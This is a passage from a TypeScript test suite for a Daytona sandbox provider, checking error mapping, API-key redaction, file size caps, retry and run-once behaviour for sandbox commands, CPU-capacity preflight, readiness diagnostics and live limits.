    mock.failNext.createStatus = 500;
    const p = make();
    await expect(p.create(spec())).rejects.toBeInstanceOf(InfraError);
    mock.failNext.createStatus = 400;
    await expect(p.create(spec())).rejects.toBeInstanceOf(SpecError);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("usage is reported on delete with the minutes the sandbox lived", async () => {
    const seen: UsageRecord[] = [];
    const p = make({ onUsage: (r) => seen.push(r) });
    const h = await p.create(spec());
    await p.destroy(h.id);
    await p.destroy(h.id); // idempotent: no second record
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatchObject({ sandboxId: h.id, name: "longshore-dev-job-1" });
    expect(seen[0]!.seconds).toBeGreaterThanOrEqual(0);
  });
});

describe("api key and errors", () => {
  test("the key is read at runtime from a file or an env var and never appears in errors", async () => {
    const file = `${import.meta.dir}/.tmp-key`;
    await Bun.write(file, `${MOCK_KEY}\n`);
    try {
      expect(await readApiKey({ file })).toBe(MOCK_KEY);
      await make({ apiKey: { file } }).healthcheck();
    } finally {
      await Bun.file(file).delete();
    }
    process.env.TT_TEST_DAYTONA_KEY = MOCK_KEY;
    try {
      await make({ apiKey: { env: "TT_TEST_DAYTONA_KEY" } }).healthcheck();
    } finally {
      delete process.env.TT_TEST_DAYTONA_KEY;
    }
    await expect(readApiKey({ env: "TT_DEFINITELY_UNSET_VAR" })).rejects.toBeInstanceOf(SpecError);
    await expect(readApiKey({ file: "/nonexistent/key" })).rejects.toBeInstanceOf(SpecError);
    const bad = make({ apiKey: () => "wrong-key-value" });
    const err = (await bad.healthcheck().catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).not.toContain("wrong-key-value");
    expect(JSON.stringify(err, Object.getOwnPropertyNames(err))).not.toContain("wrong-key-value");
  });

  test("a sandbox that disappears maps to SandboxNotFoundError on exec", async () => {
    const p = make();
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, { argv: ["sleep", "5"], timeoutSeconds: 30 });
    mock.sandboxes.delete(h.id);
    expect((await p.exec.status(h.id, execId)).state).toBe("lost");
    await expect(p.files.put(h.id, "/tmp/x", new Uint8Array(1))).rejects.toBeInstanceOf(
      SandboxNotFoundError,
    );
  });

  test("files.get streams with a running byte count: a huge body with no content-length is cut off", async () => {
    const counter = countingFetch();
    const p = make({ fetch: counter.fetch });
    const h = await p.create(spec());
    const cap = 100_000;
    const before = counter.read.bytes;
    await expect(p.files.get(h.id, "/tmp/__huge", cap)).rejects.toBeInstanceOf(FileTooLargeError);
    // It stopped at the first chunk that crossed the cap: everything before that chunk was within
    // the cap, and with it the total passed it. (Chunk sizes depend on the network, so this does
    // not assume one.)
    const got = counter.read.bytes - before;
    expect(got).toBeGreaterThan(cap);
    expect(got - counter.read.last).toBeLessThanOrEqual(cap);
    await untilCancelled(); // the server notices the hang-up asynchronously
    expect(mock.stats.hugeCancelled).toBe(true);
    await p.destroy(h.id);
  });

  test("an oversized API reply is refused as an infrastructure fault, not buffered", async () => {
    const counter = countingFetch();
    const p = make({ fetch: counter.fetch });
    mock.setHugeList(true);
    const before = counter.read.bytes;
    // The healthcheck reads the listing strictly; count() only uses it as a best-effort extra.
    const err = await p.healthcheck().catch((e: unknown) => e);
    expect(err).toBeInstanceOf(InfraError);
    // stopped at the first chunk that crossed the 16 MiB cap
    const got = counter.read.bytes - before;
    const cap = 16 * 1024 * 1024;
    expect(got).toBeGreaterThan(cap);
    expect(got - counter.read.last).toBeLessThanOrEqual(cap);
    await untilCancelled();
    expect(mock.stats.hugeCancelled).toBe(true);
  });

  test("file caps: put over the cap and get over maxBytes are FileTooLargeError", async () => {
    const p = make({ maxFileBytes: 16 });
    const h = await p.create(spec());
    await expect(p.files.put(h.id, "/tmp/x", new Uint8Array(17))).rejects.toBeInstanceOf(
      FileTooLargeError,
    );
    await p.files.put(h.id, "/tmp/tt-daytona-test/a.bin", new Uint8Array([1, 2, 3]));
    await expect(p.files.get(h.id, "/tmp/tt-daytona-test/a.bin", 2)).rejects.toBeInstanceOf(
      FileTooLargeError,
    );
    await expect(p.files.get(h.id, "/tmp/tt-daytona-test/missing", 10)).rejects.toBeInstanceOf(
      SpecError,
    );
    await p.destroy(h.id);
  });
});

describe("transient toolbox failures do not end a running job", () => {
  const FAST = { budgetMs: 3000, baseDelayMs: 1, maxDelayMs: 2 };
  const timeout = (): never => {
    throw new DOMException("The operation timed out.", "TimeoutError");
  };

  /** A fetch that fails chosen toolbox execute calls and counts them. */
  function flaky(
    plan: (n: number, body: string) => "ok" | "fail-before" | "fail-after" | Response,
  ) {
    const seen = { calls: 0, failed: 0 };
    const fn = (async (input: Parameters<typeof safeFetch>[0], init?: RequestInit) => {
      if (!String(input).endsWith("/process/execute")) return safeFetch(input, init);
      seen.calls += 1;
      const verdict = plan(seen.calls, String(init?.body ?? ""));
      if (verdict instanceof Response) return verdict;
      if (verdict === "fail-before") {
        seen.failed += 1;
        return timeout();
      }
      const res = await safeFetch(input, init);
      if (verdict === "fail-after") {
        seen.failed += 1;
        return timeout();
      }
      return res;
    }) as typeof safeFetch;
    return { fn, seen };
  }

  const isLaunch = (body: string): boolean => body.includes("setsid");

  /** Polls until the exec has exited, so a test waits for the process, not for a guessed time. */
  async function untilExited(p: DaytonaProvider, id: string, execId: string): Promise<void> {
    const deadline = Date.now() + 15_000;
    while ((await p.exec.status(id, execId)).state !== "exited") {
      if (Date.now() > deadline) throw new Error("exec did not exit");
      await Bun.sleep(20);
    }
  }

  test("a status read that times out a few times, then answers, returns the real state", async () => {
    let failing = false;
    const f = flaky(() => (failing ? "fail-before" : "ok"));
    const logs: string[] = [];
    const p = make({ fetch: f.fn, exec: { retry: FAST }, log: (m) => logs.push(m) });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "echo hi"],
      timeoutSeconds: 30,
    });
    await Bun.sleep(300);
    const before = f.seen.calls;
    failing = true;
    const pending = p.exec.status(h.id, execId);
    // Three failures, then it recovers.
    const stop = setInterval(() => {
      if (f.seen.failed >= 3) failing = false;
    }, 1);
    const st = await pending;
    clearInterval(stop);
    expect(st.state).toBe("exited");
    expect(f.seen.calls - before).toBeGreaterThanOrEqual(4);
    // Each retry was logged with the call and attempt, and nothing secret.
    expect(logs.length).toBeGreaterThanOrEqual(3);
    const retry = logs.find((l) => l.includes("exec status"));
    expect(retry).toContain("attempt 1");
    expect(logs.join("\n")).not.toContain(MOCK_KEY);
    await p.destroy(h.id);
  }, 20_000);

  test("a log read is retried the same way", async () => {
    let failing = false;
    const f = flaky(() => (failing ? "fail-before" : "ok"));
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "echo hello-log"],
      timeoutSeconds: 30,
    });
    await Bun.sleep(300);
    failing = true;
    const pending = p.exec.logs(h.id, execId, { fromOffset: 0, maxBytes: 1000 });
    const stop = setInterval(() => {
      if (f.seen.failed >= 2) failing = false;
    }, 1);
    const out = await pending;
    clearInterval(stop);
    expect(new TextDecoder().decode(out.bytes)).toContain("hello-log");
    await p.destroy(h.id);
  }, 20_000);

  test("a toolbox that always times out ends as InfraError after the budget, saying how many attempts", async () => {
    const f = flaky(() => "ok");
    const p = make({
      fetch: f.fn,
      exec: { retry: { budgetMs: 150, baseDelayMs: 5, maxDelayMs: 10 } },
    });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", "sleep 1"],
      timeoutSeconds: 30,
    });
    const dead = flaky(() => "fail-before");
    const q = make({
      fetch: dead.fn,
      exec: { retry: { budgetMs: 150, baseDelayMs: 5, maxDelayMs: 10 } },
    });
    const t0 = Date.now();
    const err = (await q.exec.status(h.id, execId).catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toMatch(/exec status failed after \d+ attempts/);
    expect(err.message).toContain("TimeoutError");
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(dead.seen.calls).toBeGreaterThan(2);
    await p.destroy(h.id);
  }, 20_000);

  test("errors that are not transient are not retried: a 500 and a bad request", async () => {
    for (const status of [500, 400]) {
      let armed = false;
      const f = flaky(() => {
        if (!armed) return "ok";
        armed = false;
        return new Response(JSON.stringify({ message: "nope" }), { status });
      });
      const p = make({ fetch: f.fn, exec: { retry: FAST } });
      const h = await p.create(spec());
      const calls = f.seen.calls;
      armed = true;
      await expect(p.exec.status(h.id, "tt1-" + "a".repeat(24))).rejects.toBeInstanceOf(
        status === 500 ? InfraError : SpecError,
      );
      expect(f.seen.calls - calls).toBe(1);
      await p.destroy(h.id);
    }
  }, 20_000);

  test("503 and 429 are transient", async () => {
    for (const status of [503, 429, 502, 504]) {
      let armed = false;
      const f = flaky(() => {
        if (!armed) return "ok";
        armed = false;
        return new Response("{}", { status });
      });
      const p = make({ fetch: f.fn, exec: { retry: FAST } });
      const h = await p.create(spec());
      const calls = f.seen.calls;
      armed = true;
      const st = await p.exec.status(h.id, "tt1-" + "b".repeat(24));
      expect(st.state).toBe("lost");
      expect(f.seen.calls - calls).toBeGreaterThanOrEqual(2);
      await p.destroy(h.id);
    }
  }, 20_000);

  test("a start whose reply was lost but which ran does not run twice", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-a`;
    let done = false;
    const f = flaky((_n, body) => (isLaunch(body) && !done ? ((done = true), "fail-after") : "ok"));
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}; sleep 1`],
      timeoutSeconds: 30,
    });
    expect(execId).toMatch(/^tt1-/);
    await untilExited(p, h.id, execId);
    const lines = (await Bun.file(marker).text()).trim().split("\n");
    expect(lines).toHaveLength(1);
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  }, 20_000);

  test("a start whose request never arrived is launched once, under the same id", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-b`;
    let done = false;
    const f = flaky((_n, body) =>
      isLaunch(body) && !done ? ((done = true), "fail-before") : "ok",
    );
    const p = make({ fetch: f.fn, exec: { retry: FAST } });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}; sleep 1`],
      timeoutSeconds: 30,
    });
    await untilExited(p, h.id, execId);
    expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
    expect((await p.exec.status(h.id, execId)).state).toBe("exited");
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  }, 20_000);

  test(
    "the original request landing AFTER its repeat still gives exactly one process",
    { timeout: 20_000 },
    async () => {
      const marker = `/tmp/tt-once-${Date.now()}-late`;
      let deferred = false;
      const late: Promise<unknown>[] = [];
      const seen = { launches: 0 };
      const base = flaky(() => "ok");
      // The first launch times out at the client at once, but its request reaches the sandbox only
      // after the repeat has already run.
      const fn = (async (input: Parameters<typeof safeFetch>[0], init?: RequestInit) => {
        const body = String(init?.body ?? "");
        if (String(input).endsWith("/process/execute") && isLaunch(body)) {
          seen.launches += 1;
          if (!deferred) {
            deferred = true;
            late.push(Bun.sleep(800).then(() => safeFetch(input, init)));
            return timeout();
          }
        }
        return base.fn(input, init);
      }) as typeof safeFetch;
      const p = make({ fetch: fn, exec: { retry: FAST } });
      const h = await p.create(spec());
      const { execId } = await p.exec.start(h.id, {
        argv: ["sh", "-c", `echo x >> ${marker}; sleep 3`],
        timeoutSeconds: 30,
      });
      // The repeat has run; now the original lands.
      await Promise.all(late);
      await Bun.sleep(300);
      expect(seen.launches).toBe(2);
      expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
      expect((await p.exec.status(h.id, execId)).state).toBe("running");
      await untilExited(p, h.id, execId);
      await Bun.$`rm -f ${marker}`;
      await p.destroy(h.id);
    },
  );

  test("an ordinary start runs the command once", async () => {
    const marker = `/tmp/tt-once-${Date.now()}-c`;
    const f = flaky(() => "ok");
    const p = make({ fetch: f.fn });
    const h = await p.create(spec());
    const { execId } = await p.exec.start(h.id, {
      argv: ["sh", "-c", `echo x >> ${marker}`],
      timeoutSeconds: 30,
    });
    await Bun.sleep(500);
    expect((await Bun.file(marker).text()).trim().split("\n")).toHaveLength(1);
    expect(execId).toMatch(/^tt1-/);
    await Bun.$`rm -f ${marker}`;
    await p.destroy(h.id);
  }, 20_000);
});

describe("the org-wide CPU check before a create", () => {
  const row = (cpu: number, over: Record<string, unknown> = {}) => ({
    regionId: "us",
    sandboxClass: "container",
    currentCpuUsage: cpu,
    ...over,
  });
  /** An account with one sandbox in it, so the org id can be learned. */
  const primed = () => mock.addForeign("someone-elses", { project: "other" }, "stopped");
  const usageReads = (): number =>
    mock.requests.filter((r) => r.path.endsWith("/usage") && r.method === "GET").length;

  test("creates when there is room, after reading the org's usage once", async () => {
    primed();
    mock.usage.rows = [row(150)];
    const p = make();
    const h = await p.create(spec());
    expect(usageReads()).toBe(1);
    await p.destroy(h.id);
  });

  test("waits while current usage plus this sandbox would pass the limit, then goes ahead", async () => {
    primed();
    mock.usage.rows = [row(200)]; // 200 + 1 > 200
    const p = make({ capacityWaitMs: 30_000 });
    const creating = p.create(spec());
    await Bun.sleep(150);
    // Still waiting: nothing was created.
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(0);
    expect(usageReads()).toBeGreaterThan(1);
    mock.usage.rows = [row(199)];
    const h = await creating;
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(1);
    await p.destroy(h.id);
  });

  test("the sandbox's own vCPU counts, and gives up with a message that says why", async () => {
    primed();
    mock.usage.rows = [row(198)];
    const p = make({ capacityWaitMs: 80 });
    const err = (await p
      .create(spec({ resources: { cpus: 4 } }))
      .catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toContain("198 vCPU in use");
    expect(err.message).toContain("needs 4");
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(0);
  });

  test("the limit, the region and the class are configurable; other regions and classes do not count", async () => {
    primed();
    mock.usage.rows = [
      row(240, { regionId: "eu" }),
      row(240, { sandboxClass: "linux-vm" }),
      row(10),
    ];
    const ok = make();
    await ok.destroy((await ok.create(spec())).id);
    mock.usage.rows = [row(50)];
    const tight = make({ ownerCiPreflight: { cpuLimit: 50 }, capacityWaitMs: 50 });
    await expect(tight.create(spec())).rejects.toBeInstanceOf(InfraError);
    mock.usage.rows = [row(5, { regionId: "eu" }), row(90, { regionId: "us" })];
    const eu = make({ ownerCiPreflight: { region: "eu" } });
    await eu.destroy((await eu.create(spec())).id);
  });

  test("no row for the region means nothing is running there; a row with no number is an error, not room", async () => {
    primed();
    mock.usage.rows = [];
    const p = make();
    await p.destroy((await p.create(spec())).id);
    mock.usage.rows = [{ regionId: "us", sandboxClass: "container" }];
    await expect(make({ capacityWaitMs: 50 }).create(spec())).rejects.toBeInstanceOf(InfraError);
  });

  test("an unreadable usage is never taken for room: an error fails the create", async () => {
    primed();
    mock.usage.status = 500;
    await expect(make({ capacityWaitMs: 50 }).create(spec())).rejects.toBeInstanceOf(InfraError);
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(0);
  });

  test("an endpoint that does not exist (404) fails the create: a check that cannot be made is not a pass", async () => {
    primed();
    mock.usage.status = 404;
    const err = (await make()
      .create(spec())
      .catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toContain("ownerCiPreflight: false");
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(0);
    // The operator opts out explicitly.
    const off = make({ ownerCiPreflight: false });
    await off.destroy((await off.create(spec())).id);
  });

  test("403 on the usage read (a customer-scoped key) falls back to the own-fleet budget, logged once", async () => {
    primed();
    mock.usage.status = 403;
    const logs: string[] = [];
    const p = make({ log: (m) => logs.push(m) });
    expect(p.capacityStatus().quotaMode).toBe("org-usage");
    await p.destroy((await p.create(spec())).id);
    await p.destroy((await p.create(spec())).id);
    expect(logs.filter((m) => m.includes("own-fleet budget mode"))).toHaveLength(1);
    expect(logs.find((m) => m.includes("own-fleet"))).toContain("org usage forbidden (403)");
    expect(usageReads()).toBe(1); // not asked again once refused
    expect(p.capacityStatus()).toMatchObject({
      quotaMode: "own-fleet",
      reason: "org usage forbidden (403)",
    });
  });

  test("only 403 falls back: 401, 404, 5xx and an unreadable body still refuse the create", async () => {
    primed();
    for (const status of [401, 404, 500, 503]) {
      mock.usage.status = status;
      await expect(make({ capacityWaitMs: 50 }).create(spec())).rejects.toBeInstanceOf(InfraError);
    }
    mock.usage.status = 200;
    mock.usage.rows = [{ regionId: "us", sandboxClass: "container" }];
    await expect(make({ capacityWaitMs: 50 }).create(spec())).rejects.toBeInstanceOf(InfraError);
    expect(
      mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox"),
    ).toHaveLength(0);
  });

  test("own-fleet mode waits at maxLive and never reads the org usage", async () => {
    primed();
    mock.usage.rows = [row(999)]; // would block org-usage mode; irrelevant here
    const p = make({ quotaMode: "own-fleet", maxLive: 1, capacityWaitMs: 80 });
    expect(p.capacityStatus()).toMatchObject({
      quotaMode: "own-fleet",
      reason: "configured",
      maxLive: 1,
    });
    const first = await p.create(spec());
    await expect(p.create(spec())).rejects.toThrow(/already 1 live sandboxes of ours \(max 1\)/);
    await p.destroy(first.id);
    await p.destroy((await p.create(spec())).id);
    expect(usageReads()).toBe(0);
  });

  test("a 403 fallback still holds the cap on our own fleet", async () => {
    primed();
    mock.usage.status = 403;
    const p = make({ maxLive: 1, capacityWaitMs: 80 });
    await p.create(spec());
    await expect(p.create(spec())).rejects.toThrow(/max 1/);
  });

  test("an empty account skips the check, says so, and learns the org id from the sandbox it creates", async () => {
    mock.usage.rows = [row(999)];
    const logs: string[] = [];
    const p = make({ log: (m) => logs.push(m), capacityWaitMs: 80 });
    // Nothing in the account: nobody else is running, so the create goes ahead, with a log line.
    const first = await p.create(spec());
    expect(usageReads()).toBe(0);
    expect(logs.join("\n")).toContain("no sandbox in the account to learn the org id from");
    // The next create has the org id from the first sandbox, and now the check applies.
    await expect(p.create(spec({ name: "job-2" })).then((h) => h.id)).rejects.toBeInstanceOf(
      InfraError,
    );
    expect(usageReads()).toBeGreaterThan(0);
    await p.destroy(first.id);
  });

  test("it can be turned off, and then no usage is read", async () => {
    primed();
    mock.usage.rows = [row(999)];
    const p = make({ ownerCiPreflight: false });
    await p.destroy((await p.create(spec())).id);
    expect(usageReads()).toBe(0);
  });

  test("it is in addition to the label count: both must have room", async () => {
    primed();
    mock.usage.rows = [row(0)];
    for (let i = 0; i < 8; i++) mock.addForeign(`ci-${i}`, { project: "acme-ci" });
    await expect(makeLabeled({ capacityWaitMs: 50 }).create(spec())).rejects.toBeInstanceOf(
      InfraError,
    );
  });
});

describe("diagnose: read-only readiness checks", () => {
  const byId = (cs: { id: string; status: string; summary: string; fix?: string }[]) =>
    Object.fromEntries(cs.map((c) => [c.id, c]));
  const mutating = (): number => mock.requests.filter((r) => r.method !== "GET").length;

  test("a usage read that answers 403 is a warning (own-fleet budget), not a failure; quotaMode own-fleet passes", async () => {
    mock.addForeign("someone-elses", { project: "other" }, "stopped");
    mock.usage.status = 403;
    const cs = byId(await make({ maxLive: 3 }).diagnose());
    expect(cs["daytona.usage"]).toMatchObject({ status: "warn" });
    expect(cs["daytona.usage"]!.summary).toContain("own-fleet budget mode, 3 sandboxes");
    const forced = byId(await make({ quotaMode: "own-fleet" }).diagnose());
    expect(forced["daytona.usage"]).toMatchObject({ status: "pass" });
    expect(mutating()).toBe(0);
  });

  test("the usage line reports disk and memory against the reply's quotas", async () => {
    mock.addForeign("someone-elses", { project: "other" }, "stopped");
    mock.usage.rows = [
      {
        regionId: "us",
        sandboxClass: "container",
        currentCpuUsage: 10,
        currentDiskUsage: 100,
        totalDiskQuota: 2000,
        currentMemoryUsage: 8,
        totalMemoryQuota: 400,
      },
    ];
    const cs = byId(await make().diagnose());
    expect(cs["daytona.usage"]!.summary).toContain("10 vCPU in use of 200");
    expect(cs["daytona.usage"]!.summary).toContain("100 of 2000 GiB disk");
    expect(cs["daytona.usage"]!.summary).toContain("8 of 400 GiB memory");
  });

  test("a healthy account passes every check, and nothing but GETs is sent", async () => {
    mock.addForeign("someone-elses", { project: "other" }, "stopped");
    mock.usage.rows = [{ regionId: "us", sandboxClass: "container", currentCpuUsage: 10 }];
    mock.snapshots.add("turntable-medium");
    const cs = byId(await make({ snapshot: "turntable-medium" }).diagnose());
    expect(cs["daytona.api"]!.status).toBe("pass");
    expect(cs["daytona.usage"]!.status).toBe("pass");
    expect(cs["daytona.snapshot"]).toMatchObject({ status: "pass" });
    expect(cs["daytona.snapshot"]!.summary).toContain("turntable-medium");
    expect(mutating()).toBe(0);
    // no sandbox was created
    expect(
      mock.requests.some((r) => r.path.startsWith("/api/sandbox") && r.method === "POST"),
    ).toBe(false);
  });

  test("a bad key fails the API check and stops, without echoing the key", async () => {
    const p = make({ apiKey: () => "not-the-mock-key-0000" });
    const cs = await p.diagnose();
    expect(cs).toHaveLength(1);
    expect(cs[0]).toMatchObject({ id: "daytona.api", status: "fail" });
    expect(JSON.stringify(cs)).not.toContain("not-the-mock-key-0000");
  });

  test("an unreadable key file is said plainly, with a fix", async () => {
    const cs = await make({ apiKey: { file: "/nonexistent/key-file" } }).diagnose();
    expect(cs[0]).toMatchObject({ id: "daytona.api", status: "fail" });
    expect(cs[0]!.fix).toContain("key");
    // The upstream error text is in `detail`, not in the summary the API returns.
    expect(cs[0]!.summary).toBe("the Daytona API is not usable");
    expect(typeof cs[0]!.detail).toBe("string");
  });

  test("a usage endpoint that answers 404 fails, because no sandbox would be created", async () => {
    mock.addForeign("someone-elses", { project: "other" }, "stopped");
    mock.usage.status = 404;
    const cs = byId(await make().diagnose());
    expect(cs["daytona.usage"]).toMatchObject({ status: "fail" });
    expect(cs["daytona.usage"]!.fix).toContain("ownerCiPreflight");
  });

  test("an empty account cannot tell the org id: a warning, not a failure", async () => {
    const cs = byId(await make().diagnose());
    expect(cs["daytona.usage"]).toMatchObject({ status: "warn" });
  });

  test("the org check turned off is a warning", async () => {
    const cs = byId(await make({ ownerCiPreflight: false }).diagnose());
    expect(cs["daytona.usage"]).toMatchObject({ status: "warn" });
  });

  test("a snapshot that does not exist fails, with no snapshot created", async () => {
    const cs = byId(await make({ snapshot: "missing-one" }).diagnose());
    expect(cs["daytona.snapshot"]).toMatchObject({ status: "fail" });
    expect(cs["daytona.snapshot"]!.summary).toContain("does not exist");
    expect(mutating()).toBe(0);
  });

  test("no snapshot named uses the account's default", async () => {
    const cs = byId(await make().diagnose());
    expect(cs["daytona.snapshot"]).toMatchObject({ status: "pass" });
  });
});

describe("live limits (#661)", () => {
  const posts = () => mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox");

  test("a raised max_live applies to the next create of the same provider, with no rebuild", async () => {
    const live: { maxLive?: number; cpuLimit?: number } = { maxLive: 1 };
    const p = make({ limits: () => live, capacityWaitMs: 40 });
    const a = await p.create(spec({ name: "a" }));
    await expect(p.create(spec({ name: "b" }))).rejects.toBeInstanceOf(InfraError);
    live.maxLive = 2;
    const b = await p.create(spec({ name: "b" }));
    expect(mock.sandboxes.size).toBe(2);
    await p.destroy(a.id);
    await p.destroy(b.id);
  });

  test("a lowered max_live stops nothing running and holds new creates", async () => {
    const live: { maxLive?: number } = { maxLive: 2 };
    const p = make({ limits: () => live, capacityWaitMs: 40 });
    const a = await p.create(spec({ name: "a" }));
    const b = await p.create(spec({ name: "b" }));
    live.maxLive = 1;
    expect(mock.sandboxes.size).toBe(2); // nothing was destroyed
    await expect(p.create(spec({ name: "c" }))).rejects.toBeInstanceOf(InfraError);
    await p.destroy(a.id);
    await p.destroy(b.id);
  });

  test("a live max_live is still clamped to the hard ceiling", async () => {
    const p = make({ limits: () => ({ maxLive: 501 }) });
    await expect(p.create(spec())).rejects.toBeInstanceOf(RangeError);
  });

  test("a changed cpu_limit applies to the next create's org preflight", async () => {
    // An account with one sandbox in it, so the org id can be learned, and 100 vCPU in use.
    mock.addForeign("someone-elses", { project: "other" }, "stopped");
    mock.usage.rows = [{ regionId: "us", sandboxClass: "container", currentCpuUsage: 100 }];
    const live: { cpuLimit?: number } = { cpuLimit: 100 };
    const p = make({ limits: () => live, capacityWaitMs: 40 });
    await expect(p.create(spec())).rejects.toBeInstanceOf(InfraError);
    expect(posts()).toHaveLength(0);
    live.cpuLimit = 150;
    await p.destroy((await p.create(spec())).id);
    expect(posts()).toHaveLength(1);
  });
});
